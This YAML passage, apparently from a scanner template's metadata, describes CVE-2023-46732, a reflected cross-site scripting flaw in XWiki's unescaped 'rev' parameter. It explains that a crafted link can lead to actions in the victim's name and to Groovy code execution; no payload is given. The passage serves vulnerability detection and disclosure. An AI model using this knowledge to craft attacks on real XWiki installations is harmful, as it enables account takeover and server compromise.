  classification: CVE-2023-46732
  description: 'XWiki is vulnerable to reflected cross-site scripting (RXSS) via the
    rev parameter that is used in the content of the content menu without escaping.
    If an attacker can convince a user to visit a link with a crafted parameter, this
    allows the attacker to execute arbitrary actions in the name of the user, including
    remote code (Groovy) execution in the case of a user with programming right, compromising
    the confidentiality, integrity and availability of the whole XWiki installation.
